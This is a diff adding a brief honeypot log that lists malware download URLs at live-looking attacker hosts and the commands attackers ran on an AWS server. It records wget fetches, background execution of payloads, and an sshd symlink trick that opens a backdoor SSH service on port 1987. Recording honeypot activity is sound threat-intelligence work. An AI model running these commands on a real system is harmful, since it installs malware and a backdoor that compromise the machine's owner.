@@ -1,0 +1,18 @@
+
+# Links to malware obtained via AWS honeypot. Included the commands ran after the malware was downloaded.
+
+
+syn.sh - wget http://58.218.66.85:12345/syn.sh 
+
+
+888    - wget http://58.218.66.85:12345/888
+
+
+666    - wget http://58.218.66.85:12345/666
+       - ./666
+       - ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=1987
+
+
+exp    - wget http://mdb7.cn:8081/exp 
+       - nohup /root/exp > /dev/null 2>&1 &
+
